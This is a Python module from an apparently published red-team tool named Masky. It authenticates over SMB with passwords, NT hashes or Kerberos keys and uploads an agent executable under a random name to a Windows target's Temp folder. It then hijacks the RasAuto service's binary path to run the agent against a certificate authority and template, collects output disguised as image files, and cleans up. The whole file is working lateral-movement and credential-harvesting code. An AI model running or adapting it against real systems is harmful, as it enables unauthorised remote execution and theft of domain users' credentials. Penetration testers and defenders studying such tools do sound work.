import logging
import string
import random
from .results import MaskyResults
from pkg_resources import resource_filename
from impacket.dcerpc.v5 import transport, scmr
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.ndr import NULL

logger = logging.getLogger("masky")


class Smb:
    def __init__(
        self,
        domain,
        username,
        dc_target,
        password=None,
        hashes=None,
        kerberos=None,
        aeskey=None,
    ):
        self.__domain = domain
        self.__username = username
        self.__password = password
        self.__lmhash, self.__nthash = "", ""
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(":")
        self.__dc_target = dc_target
        self.__kerberos = kerberos
        self.__aeskey = aeskey

        self.__rpc_con = None
        self.__scmr_con = None
        self.__svc_handle = None
        self.__svc_name = "RasAuto"
        self.__service = None

        self.__initial_binary_path = None
        self.__initial_start_type = None
        self.__initial_error_control = None

        self.__port = 445
        self.__share = "C$"
        self.__error_filename = (
            f"{''.join(random.choices(string.ascii_lowercase, k=8))}.png"
        )
        self.__output_filename = (
            f"{''.join(random.choices(string.ascii_lowercase, k=8))}.jpg"
        )
        self.__agent_filename = (
            f"{''.join(random.choices(string.ascii_lowercase, k=8))}.exe"
        )
        self.__masky_remote_path = f"\\Windows\\Temp\\{self.__agent_filename}"
        self.__results_remote_path = f"\\Windows\\Temp\\{self.__output_filename}"
        self.__errors_remote_path = f"\\Windows\\Temp\\{self.__error_filename}"
        self.__masky_local_path = resource_filename("masky.bin", "Masky.exe")
        logger.debug(
            f"The Masky agent binary will be uploaded in: {self.__masky_remote_path}"
        )
        logger.debug(
            f"The Masky agent output will be stored in: {self.__results_remote_path}"
        )
        logger.debug(
            f"The Masky agent errors will be stored in: {self.__errors_remote_path}"
        )

    def exec_masky(self, target, ca, template):
        try:
            self.__upload_masky(target)
            logger.debug(
                f"Masky agent was successfuly uploaded in: '{self.__masky_remote_path}'"
            )
        except Exception as e:
            if "STATUS_ACCESS_DENIED" in str(e):
                logger.warn(
                    f"The user {self.__domain}\{self.__username} is not local administrator on this system"
                )
            elif "STATUS_LOGON_FAILURE" in str(e):
                logger.error(
                    f"The provided credentials for the user '{self.__domain}\{self.__username}' are invalids or the user does not exist"
                )
            else:
                logger.error(f"Fail to upload the agent ({str(e)})")
            raise Exception
        try:
            self.__init_rpc(target)
            self.__init_scmr()
            self.__edit_svc(ca, template)
            logger.debug(f"The service '{self.__svc_name}' was successfuly modified")
        except Exception as e:
            logger.error(f"Fail to edit the '{self.__svc_name}' service via DCERPC")
            self.__clean(target)
            raise Exception
        try:
            scmr.hRStartServiceW(self.__scmr_con, self.__service)
        except Exception as e:
            pass
        logger.debug(f"The '{self.__svc_name}' was restarted for command execution")

        rslt = None
        try:
            rslt = self.__process_results(target)
        except Exception as e:
            logger.error(f"The Masky agent execution probably failed ({str(e)})")
        self.__clean(target)
        return rslt

    def __upload_masky(self, target_host):
        smbclient = SMBConnection(target_host, target_host, sess_port=self.__port)
        if self.__kerberos:
            smbclient.kerberosLogin(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aeskey,
                self.__dc_target,
            )
        else:
            smbclient.login(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
            )
        with open(self.__masky_local_path, "rb") as p:
            smbclient.putFile(self.__share, self.__masky_remote_path, p.read)
        smbclient.close()
        logger.result(
            "Current user seems to be local administrator, attempting to run Masky agent..."
        )

    def __remove_masky(self, target_host):
        smbclient = SMBConnection(target_host, target_host, sess_port=self.__port)
        if self.__kerberos:
            smbclient.kerberosLogin(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aeskey,
                self.__dc_target,
            )
        else:
            smbclient.login(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
            )
        try:
            smbclient.deleteFile(self.__share, self.__masky_remote_path)
        except:
            logger.warn(
                f"Fail to remove Masky agent located in: {self.__masky_remote_path}"
            )
        smbclient.close()

    def __process_results(self, target_host):
        rslt = MaskyResults()
        smbclient = SMBConnection(target_host, target_host, sess_port=self.__port)
        if self.__kerberos:
            smbclient.kerberosLogin(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aeskey,
                self.__dc_target,
            )
        else:
            smbclient.login(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
            )

        try:
            smbclient.getFile(
                self.__share,
                self.__results_remote_path,
                rslt.save_content_to_json,
            )
        except:
            logger.warn("No Masky agent output file was downloaded")

        try:
            smbclient.deleteFile(self.__share, self.__results_remote_path)
        except:
            logger.warn(
                f"Fail to remove Masky agent output file located in: {self.__results_remote_path}"
            )

        try:
            smbclient.getFile(
                self.__share,
                self.__errors_remote_path,
                rslt.parse_agent_errors,
            )
            if rslt.errors:
                logger.error(
                    f"The Masky agent execution failed, enable the debugging to display the stacktrace"
                )
        except:
            logger.warn("No Masky agent error file was downloaded")
        try:
            smbclient.deleteFile(self.__share, self.__errors_remote_path)
        except:
            logger.warn(
                f"Fail to remove Masky agent error file located in: {self.__errors_remote_path}"
            )

        if rslt.json_data and len(rslt.json_data) == 0:
            logger.debug(
                "Masky agent was successfully executed but no active session was found"
            )
            return rslt

        if rslt.json_data:
            rslt.process_data()
        smbclient.close()
        return rslt

    def __init_rpc(self, target_host):
        np_bind = f"ncacn_np:{target_host}[\pipe\svcctl]"
        self.__rpc_con = transport.DCERPCTransportFactory(np_bind)
        self.__rpc_con.set_dport(self.__port)
        self.__rpc_con.setRemoteHost(target_host)
        if hasattr(self.__rpc_con, "set_credentials"):
            self.__rpc_con.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aeskey,
            )
        self.__rpc_con.set_kerberos(self.__kerberos, self.__dc_target)

    def __init_scmr(self):
        self.__scmr_con = self.__rpc_con.get_dce_rpc()
        self.__scmr_con.connect()
        smb_socket = self.__rpc_con.get_smb_connection()
        smb_socket.setTimeout(300000)
        self.__scmr_con.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr_con)
        self.__svc_handle = resp["lpScHandle"]
        resp = scmr.hROpenServiceW(self.__scmr_con, self.__svc_handle, self.__svc_name)
        self.__service = resp["lpServiceHandle"]

    def __edit_svc(self, ca, template):
        resp = scmr.hRQueryServiceConfigW(self.__scmr_con, self.__service)
        self.__initial_binary_path = resp["lpServiceConfig"]["lpBinaryPathName"]
        self.__initial_start_type = resp["lpServiceConfig"]["dwStartType"]
        self.__initial_error_control = resp["lpServiceConfig"]["dwErrorControl"]
        logger.debug(
            f"The current '{self.__svc_name}' service binary path is: '{self.__initial_binary_path}'"
        )
        scmr.hRChangeServiceConfigW(
            self.__scmr_con,
            self.__service,
            scmr.SERVICE_NO_CHANGE,
            scmr.SERVICE_DEMAND_START,
            scmr.SERVICE_ERROR_IGNORE,
            f'{self.__masky_remote_path} "{ca}" "{template}" "{self.__output_filename}" "{self.__error_filename}"',
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
        )

    def __revert_svc(self):
        try:
            scmr.hRChangeServiceConfigW(
                self.__scmr_con,
                self.__service,
                scmr.SERVICE_NO_CHANGE,
                self.__initial_start_type,
                self.__initial_error_control,
                self.__initial_binary_path,
                NULL,
                NULL,
                NULL,
                NULL,
                NULL,
                NULL,
                NULL,
                NULL,
            )
            logger.debug(
                f"The '{self.__svc_name}' service binary path has been restored"
            )
        except Exception as e:
            logger.warn(
                f"Fail to revert '{self.__svc_name}' service binary path ({str(e)}])"
            )

    def __clean(self, target_host):
        try:
            self.__revert_svc()
        except:
            logger.warning(
                f"An error occurred while trying to restore service {self.__svc_name}. Trying again..."
            )
            try:
                self.__init_scmr()
                self.__revert_svc()
            except Exception as e:
                logger.warning(
                    f"An unknown error occured while trying to revert '{self.__svc__name}' ({str(e)})"
                )
        try:
            scmr.hRControlService(
                self.__scmr_con, self.__service, scmr.SERVICE_CONTROL_STOP
            )
            scmr.hRCloseServiceHandle(self.__scmr_con, self.__service)
        except:
            pass
        try:
            self.__remove_masky(target_host)
        except Exception as e:
            logger.warn(f"Fail to remove Masky related files on the target ({str(e)}")
